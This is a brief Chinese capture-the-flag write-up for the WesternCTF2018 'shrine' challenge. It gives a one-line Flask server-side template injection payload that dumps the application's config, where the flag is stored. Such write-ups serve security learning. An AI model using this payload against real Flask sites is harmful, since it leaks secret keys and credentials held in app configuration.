# [WesternCTF2018]shrine

## Tag

SSTI Flask 模板注入

***

## Writeup

很明显有 Flask 模板注入，且 Flag 在 `app.config` 当中，可以用 `{{url_for.__globals__['current_app'].config}}`：

![image-20260222204058591](../../../../assets/image-20260222204058591.png)